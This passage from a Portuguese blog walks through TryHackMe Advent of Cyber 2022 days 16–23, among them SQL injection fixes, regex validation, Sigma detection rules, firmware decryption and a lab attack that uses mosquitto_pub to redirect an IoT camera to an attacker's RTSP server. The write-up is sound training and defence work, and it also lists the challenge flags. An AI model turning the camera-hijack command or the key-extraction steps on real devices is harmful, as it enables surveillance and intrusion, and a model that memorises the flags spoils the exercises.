</span></span><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from users where id=&#34;</span><span class="o">.</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// linha 17
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from toys where creator_id=&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from toys where creator_id=&#34;</span><span class="o">.</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/aoc2022/16.1.png" alt="Flag1"  />
</p>
<p>Agora na questão 2 precisamos corrigir o search-toys.php. Aqui ao invés de só juntar o texto da query com os argumentos, será definido onde eles devem ser encaixados e o banco de dados fará isso de forma segura. A flag obtida é <strong>THM{KodeNRoll}</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// linhas 4 e 5 antes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from toys where name like &#39;%&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;%&#39; or description like &#39;%&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;%&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$toys_rs</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$q</span> <span class="o">=</span> <span class="s2">&#34;%&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;%&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from toys where name like ? or description like ?&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stmt</span> <span class="o">=</span> <span class="nx">mysqli_prepare</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mysqli_stmt_bind_param</span><span class="p">(</span><span class="nv">$stmt</span><span class="p">,</span> <span class="s1">&#39;ss&#39;</span><span class="p">,</span> <span class="nv">$q</span><span class="p">,</span> <span class="nv">$q</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mysqli_stmt_execute</span><span class="p">(</span><span class="nv">$stmt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$toys_rs</span><span class="o">=</span><span class="nx">mysqli_stmt_get_result</span><span class="p">(</span><span class="nv">$stmt</span><span class="p">);</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/aoc2022/16.2.png" alt="Flag2"  />
</p>
<p>Na terceira questão as alterações são no toy.php. Assim como na primeira questão, só é necessário validar se a entrada é um número inteiro, então utiliza-se a mesma função intval. A flag obtida é <strong>THM{Are we secure yet?}</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// linha 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from toys where id=&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from toys where id=&#34;</span><span class="o">.</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// linha 30
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from kids where assigned_toy_id=&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from kids where assigned_toy_id=&#34;</span><span class="o">.</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/aoc2022/16.3.png" alt="Flag3"  />
</p>
<p>A última questão será para corrigir o login.php. Para essa questão a resolução é muito parecida com a da segunda. Os parâmetros não devem ser anexados a strings para formar a query mas fazer isso utilizando algumas funções. A flag obtida é <strong>THM{SQLi_who???}</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// linhas 8 e 9 antes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from users where username=&#39;&#34;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&#34;&#39; and password=&#39;&#34;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$users_rs</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from users where username= ? and password= ?&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stmt</span> <span class="o">=</span> <span class="nx">mysqli_prepare</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mysqli_stmt_bind_param</span><span class="p">(</span><span class="nv">$stmt</span><span class="p">,</span> <span class="s1">&#39;ss&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mysqli_stmt_execute</span><span class="p">(</span><span class="nv">$stmt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$users_rs</span><span class="o">=</span><span class="nx">mysqli_stmt_get_result</span><span class="p">(</span><span class="nv">$stmt</span><span class="p">);</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/aoc2022/16.4.png" alt="Flag4"  />
</p>
<h2 id="day-17-filtering-for-order-amidst-chaos">[Day 17] Filtering for Order Amidst Chaos</h2>
<p>Seguindo em código seguro, hoje é explicado sobre expressões regulares (regex) para validação de cadeias de caracteres que podem ser inseridas pelo usuário. A partir de regex é possível criar linguagens regulares que serão interpretadas por um analisador léxico.</p>
<p>Para as questões será necessário criar três expressões para definir nome de usuário, email e URL. Com as expressões será utilizado o utilitário egrep para analisar um arquivo que contém várias entradas.</p>
<p>A primeira expressão que é pedida é para usuário. O usuário deve ser formado por caracteres alfanuméricos com tamanho entre 6 e 12. O regex que usaremos será o seguinte ^[a-zA-Z0-9]{6,12}$. ^ é utilizado para definir início de palavra, enquanto $ define o final, assim só casará com palavra formadas exclusivamente pela expressão. [] serve para definir um conjunto de caracteres que serão considerados, como queremos caracteres alfanuméricos pode ser letras minúsculas, maiúsculas e dígitos. E o {} define a quantidade mínima e máxima do item anterior.</p>
<p>Com essa expressão encontramos <strong>8</strong> cadeias no arquivo, sendo que a única formada por palavra legível com número é <strong>User35</strong>, sendo estas as resposta para as questões 1 e 2 respectivamente.</p>
<p><img loading="lazy" src="/images/aoc2022/17.1.png" alt="Regex para Nome de Usuário"  />
</p>
<p>O próximo regex é para email, é informado que a primeira parte do email pode ser um conjunto aleatório de caracteres seguido pelo arroba, então um domínio e todos os <em>top-level domains (tld)</em> serão &ldquo;.com&rdquo;. Seguindo essas regras a expressão será ^.+@.+\.com$. O caractere ponto &lsquo;.&rsquo; significa, em regex, qualquer coisa, enquanto o mais &lsquo;+&rsquo; exige um ou mais do anterior. Assim o &lsquo;.+&rsquo; será uma cadeia de um ou mais caracteres aleatórios. E para que possamos utilizar o ponto em &ldquo;.com&rdquo; devemos escapar com o contra barra &lsquo;'.</p>
<p>Analisando o arquivo com essa expressão é retornado <strong>11</strong> endereços de email, sendo de <strong>7</strong> domínios diferentes. As questões 5 e 6 pedem pelo domínio de dois usuários que são <strong>amg.com</strong> e <strong>fedfull.com</strong>. E a sétima questão pede pelo usuário do hotmail, que é o <strong>hussain.volt</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/17.2.png" alt="Regex para Nome de Email"  />
</p>
<p>A última expressão será para definir URLs. Elas devem começar com http ou https, podendo conter ou não o &ldquo;www.&rdquo;, um nome do domínio e devem terminar com um tld. Resultando em ^https?://(www.)?.+..+$. O ponto de interrogação &lsquo;?&rsquo; é utilizado para indicar que o anterior é opcional e os () fazem com que o que está dentro seja analisado em conjunto. Com isso, tanto o &rsquo;s&rsquo; quanto o &ldquo;www.&rdquo; não são obrigatórios, o resto segue as mesmas lógicas de antes.</p>
<p>Então obtemos <strong>16</strong> URLs no total, com apenas <strong>7</strong> sendo &ldquo;https&rdquo;.</p>
<p><img loading="lazy" src="/images/aoc2022/17.3.png" alt="Regex para Nome de URL"  />
</p>
<h2 id="day-18-lumberjack-lenny-learns-new-rules">[Day 18] Lumberjack Lenny Learns New Rules</h2>
<p>O dia 16 aborda as regras sigma para detecção de intrusão. O sigma é uma linguagem para descrever assinaturas para analisar os logs, dessa forma podendo encontrar potenciais ameaças.</p>
<p>Para a resolução das questões, precisaremos criar regras sigma para detectar os seguintes indicadores de comprometimento mostrados abaixo. O primeiro é explicado como fazer na parte teórica da Task.</p>
<p><img loading="lazy" src="/images/aoc2022/18.1.png" alt="Indicators of Compromise"  />
</p>
<p>A primeira regra deverá detectar a criação de contas locais no Windows. Então devemos buscar nos logs de segurança do Windows pelo EventID 4720. Dessa forma a regra fica como mostrada abaixo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l">account creation</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="m">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l">experimental</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">description</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l">lukewicz</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">date</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">modified</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">logsource</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l">windows</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l">security</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">category</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">detection</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">selection</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">EventID</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span>- <span class="m">4720</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l">selection </span><span class="w">
</span></span></span></code></pre></div><p>Com a regra pronta, basta clicar em &ldquo;Run&rdquo; para testá-la. Então é retornado a flag <strong>THM{n0t_just_your_u$ser}</strong>. A segunda questão pede pela conta que foi criada, ao ver o log encontrado com essa regra encontramos o <strong>BanditYetiMini</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/18.2.png" alt="Conta Local Criada"  />
</p>
<p>Seguindo, a próxima regra é para descobrir se o adversário está buscando pelos softwares instalados no computador a partir dos Registros do Windows. Agora buscaremos no sysmon com o EventID 1, o aplicativo reg.exe e por comandos que contenham reg, query, /v e svcVersion.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l">software discovery</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="m">2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l">experimental</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">description</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l">lukewicz</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">date</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">modified</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">logsource</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l">windows</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l">sysmon</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">category</span><span class="p">:</span><span class="w"> </span><span class="l">process_creation</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">detection</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">selection</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">EventID</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span>- <span class="m">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">Image|endswith</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">reg.exe</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">CommandLine|contains|all</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">reg</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">query</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">/v</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">svcVersion</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l">selection</span><span class="w">
</span></span></span></code></pre></div><p>Com essa regra obtemos a flag <strong>THM{wh@t_1s_Runn1ng_H3r3}</strong>. A questão 4 pede pelo usuário que foi encontrado no log do desafio 2, sendo este o <strong>SIGMA_AOC2022\Bandit Yeti</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/18.3.png" alt="Conta que Realizou Software Discovery"  />
</p>
<p>A última regra é para achar a criação de tarefas agendadas no Windows. Como na anterior, buscaremos por logs do sysmon, mas agora que utilizem o Task Scheduler. Então a imagem deve ser schtasks.exe e o comando deve ter schtasks e /create.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l">scheduled task</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="m">3</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l">experimental</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">description</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l">lukewicz</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">date</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">modified</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">logsource</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l">windows</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l">sysmon</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">category</span><span class="p">:</span><span class="w"> </span><span class="l">process_creation</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">detection</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">selection</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">EventID</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span>- <span class="m">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">Image|endswith</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">schtasks.exe</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">CommandLine|contains|all</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">schtasks</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">/create</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l">selection</span><span class="w">
</span></span></span></code></pre></div><p>Com isso obtemos a flag <strong>THM{sch3dule_0npo1nt_101}</strong>. E por fim a última questão pede pelo hash associado ao log desse desafio, <strong>2F6CE97FAF2D5EEA919E4393BDD416A7</strong>.</p>
<h2 id="day-19-wiggles-go-brrr">[Day 19] Wiggles go brrr</h2>
<p>Na Task de hoje é explicado o básico de Hardware Hacking, buscando por informações nos sinais elétricos transmitidos pelos dispositivos. É explicado sobre os padrões de comunicação USART, SPI e I2C, além de ter uma parte prática para decodificar os sinais utilizando um software de simulação chamado Saleae.</p>
<p>A primeira questão pede pelo dispositivo que é utilizado para examinar os sinais. Sendo este um <strong>logic analyser</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/19.1.png" alt="Logic Analyser"  />
</p>
<p>As questões 3 e 4 são um comparativo do USART com o SPI. Como é explicado acima na Task o USART é mais lento que o SPI, porém o SPI utiliza mais cabos para essa comunicação. Então as respostas são <strong>nay</strong> e <strong>yea</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/19.2.png" alt="SPI"  />
</p>
<p>As próximas três questões são comparando o I2C com os outros dois padrões anteriores. Segundo o texto, o I2C é mais rápido que o USART mas mais lento que o SPI, além de utilizar o mesmo número de fios que o USART então menos que o SPI. COnsiderando isso as respostas ficam <strong>nay</strong>, <strong>nay</strong> e <strong>yea</strong>.</p>
<p>E como é citado no texto o I2C consegue atingir um máximo de <strong>1008</strong> conexões utilizando um único par de cabos, respondendo a sétima questão.</p>
<p><img loading="lazy" src="/images/aoc2022/19.3.png" alt="I2C"  />
</p>
<p>As últimas duas questões são práticas relacionadas ao arquivo de captura &ldquo;santa&rdquo; que pode ser analisado utilizando o software Logic 2.4.2 que estão na máquina anexada nessa Task.</p>
<p>A questão 8 pede pela taxa de bauds que está sendo transmitida entre o microprocessador e a ESP32. Ao entrar na aba &ldquo;Analyzers&rdquo; e escolher a opção &ldquo;Async Serial&rdquo; é mostrado uma nova tela em que é informado a &ldquo;Bit Rate&rdquo; como sendo <strong>9600</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/19.4.png" alt="I2C"  />
</p>
<p>Agora para encontrarmos a flag que foi transmitida, escolhemos nessa mesma tela o canal &ldquo;&ldquo;00. Channel 0&rdquo; como canal de input, o resto das configurações permanecem iguais. Assim ficamos com uma tela igual a esta.</p>
<p><img loading="lazy" src="/images/aoc2022/19.5.png" alt="I2C"  />
</p>
<p>Com as configurações do analisador feitas podemos salvar. Então na aba &ldquo;Analyzers&rdquo; mudamos a visualização dos dados para &ldquo;Terminal&rdquo; clicando no ícone de terminal. Com isso podemos ler os dados transmitidos e no final está a flag <strong>THM{Hacking.Hardware.Is.Fun}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/19.6.png" alt="I2C"  />
</p>
<h2 id="day-20-binwalkin-around-the-christmas-tree">[Day 20] Binwalkin’ around the Christmas tree</h2>
<p>O vigésimo dia é sobre Firmware. Firmware é o software de mais baixo nível que faz a comunicação entre o hardware e os outros softwares do dispositivo. A Task de hoje é um passo a passo de como descriptografar um firmware para obter o código-fonte.</p>
<p>Ao logar na máquina temos dois firmwares, um deles mais recente e criptografado com o gpg e o outro mais antigo não criptografado. Na pasta do mais antigo, &ldquo;~/bin-unsigned&rdquo;, podemos extrair o conteúdo do &ldquo;firmwarev1.0-unsigned&rdquo; com o comando &ldquo;extract-firmware.sh firmwarev1.0-unsigned&rdquo;.</p>
<p><img loading="lazy" src="/images/aoc2022/20.1.png" alt="Extrair Firmware Antigo"  />
</p>
<p>Com o firmware extraído, podemos buscar por senhas que estavam armazenadas nele. Com o comando &ldquo;grep -ir paraphrase&rdquo; conseguimos encontrar uma senha, que está no diretório gpg que contém também uma chave pública e privada. A senha encontrada é <strong>Santa@2022</strong> e é a resposta para a segunda pergunta.</p>
<p><img loading="lazy" src="/images/aoc2022/20.2.png" alt="Paraphrase"  />
</p>
<p>Podemos então importar para o gpg as chaves que obtivemos para poder desencriptar o outro firmware.</p>
<p><img loading="lazy" src="/images/aoc2022/20.3.png" alt="Importando Chaves GPG"  />
</p>
<p>Com esse firmware já desencriptado podemos extrair o conteúdo dele, assim como fizemos com o anterior.</p>
<p><img loading="lazy" src="/images/aoc2022/20.4.png" alt="Extrair Firmware Novo"  />
</p>
<p>Com o grep novamente podemos buscar pela flag para responder a primeira questão e pelo versão da <em>build</em> para a última questão. Assim obtemos a flag <strong>THM{WE_GOT_THE_FIRMWARE_CODE}</strong> e a versão <strong>2.6.31</strong>. O terminal acabou escondendo os &lsquo;_&rsquo;.</p>
<p><img loading="lazy" src="/images/aoc2022/20.5.png" alt="Flag e Build"  />
</p>
<h2 id="day-21-have-yourself-a-merry-little-webcam">[Day 21] Have yourself a merry little webcam</h2>
<p>O tópico de hoje é MQTT e IoT. MQTT é protocolo utilizado para comunicação com dispositivos IoT, ele se baseia em um modelo de <em>publish/subscribe</em> para enviar e receber mensagens.</p>
<p>A primeira questão pede em qual porta o &ldquo;Mosquitto&rdquo; está rodando. Pesquisando no Google é possível ver que o MQTT por padrão utiliza a porta <strong>1883</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/21.1.png" alt="Porta Padrão do MQTT"  />
</p>
<p>Com essa informação podemos utilizar o nmap para examinar essa porta, para obter as informações para as duas questões seguintes. O nmap encontra a versão do mosquitto como sendo <strong>1.6.9</strong> e o script consegue enumerar o &ldquo;device/init&rdquo;, então a resposta é <strong>y</strong>, como mostrado na imagem abaixo.</p>
<p><img loading="lazy" src="/images/aoc2022/21.2.png" alt="Scan do Nmap"  />
</p>
<p>Agora para conseguir a flag é um pouco mais complicado. Primeiro usaremos um docker para iniciar um servidor de RTSP utilizando o comando &ldquo;docker run &ndash;rm -it &ndash;network=host aler9/rtsp-simple-server&rdquo;.</p>
<p><img loading="lazy" src="/images/aoc2022/21.4.png" alt="Iniciar Servidor RTSP"  />
</p>
<p>Então publicaremos o nosso payload no dispositivo alvo utilizando o mosquitto_pub com o id, a URL do RTSP deve conter o ip da máquina atacante com um <em>path</em> qualquer. Assim o comando fica por exemplo &ldquo;mosquitto_pub -h 10.10.157.94 -t device/PL52DK4FAPBFGX3J3QHC/cmd -m &ldquo;&rdquo;&rdquo;{&ldquo;cmd&rdquo;:&ldquo;10&rdquo;,&ldquo;url&rdquo;:&ldquo;rtsp://10.10.100.41:8554/lukewicz&rdquo;}&rdquo;&rdquo;&quot; &ldquo;.</p>
<p>E para acessar as imagens podemos conectar utilizando o VLC passando como argumento o servidor que definimos anteriormente.</p>
<p><img loading="lazy" src="/images/aoc2022/21.5.png" alt="Iniciar Conexão com o Mosquitto"  />
</p>
<p>Então ao visualizar o vídeo encontramos a flag <strong>THM{UR_CAMERA_IS_MINE}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/21.3.png" alt="Iniciar Conexão com o Mosquitto"  />
</p>
<h2 id="day-22-threats-are-failing-all-around-me">[Day 22] Threats are failing all around me</h2>
<p>No dia 22, é explicado sobre redução de superfície de ataque. Superfície de ataque são as áreas da vítima que podem ser utilizadas por um adversário para a realização de um ataque. Assim com a redução dela visa reduzir os vetores de ataque que possam comprometer o sistema.</p>
<p>Para conseguir a flag de hoje é só inserir as respostas certas nas perguntas em uma página anexada a Task, como pode ser visto na imagem abaixo.</p>
<p><img loading="lazy" src="/images/aoc2022/22.1.png" alt="Perguntas e Respostas"  />
</p>
<p>Com a página anterior respondida, vamos clicar em &ldquo;Next&rdquo; para ir para outra página e conseguir a flag <strong>THM{4TT4CK SURF4C3 R3DUC3D}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/22.2.png" alt="Flag"  />
</p>
<h2 id="day-23-mission-elfpossible-abominable-for-a-day">[Day 23] Mission ELFPossible: Abominable for a Day</h2>
<p>Finalmente véspera da véspera de Natal, dia 23, hoje é explicado sobre defesa em profundidade. Esse é um conceito que visa utilizar várias formas de defesa para que caso uma falhe ainda existam outras para defender, uma vez que nenhuma defesa é insuperável. Para as flag tem um joguinho onde devemos invadir o escritório do Papai Noel para conseguir a lista de bons e maus.</p>
<p>No primeiro caso, com qualquer uma das desculpas o guarda libera o portão, então clicando nele entramos no complexo. Ao entrar no escritório do assistente executivo e abrir a primeira gaveta encontramos um senha guardada, <strong>S3cr3tV@ultPW</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.1.png" alt="Senha do Cofre 1"  />
</p>
<p>Com essa senha podemos ir no escritório do Papai Noel e desbloquear o cofre dele, com isso conseguimos a primeira flag, THM{EZ_fl@6!}, encerrando o primeiro caso.</p>
<p><img loading="lazy" src="/images/aoc2022/23.2.png" alt="Flag 1"  />
</p>
<p>No caso seguinte o guarda já está mais bem treinado, deste modo apenas a desculpa de que vai entregar algo para o assistente executivo faz o guarda permitir o acesso. Ao entrar podemos encontrar no Post-it do assistente a coisa favorita do Papai Noel, <strong>MilkAndCookies</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.3.png" alt="Comida Favorita Papai Noel"  />
</p>
<p>Com isso podemos desbloquear o computador do Papai Noel que está no escritório dele e obter a partir de um arquivo de texto a senha do cofre, <strong>3XtrR@_S3cr3tV@ultPW</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.4.png" alt="Senha do Cofre 2"  />
</p>
<p>Abrindo o cofre novamente encontramos a segunda flag, <strong>THM{m0@r_5t3pS_n0w!}</strong>, e terminamos esse caso.</p>
<p><img loading="lazy" src="/images/aoc2022/23.5.png" alt="Flag 2"  />
</p>
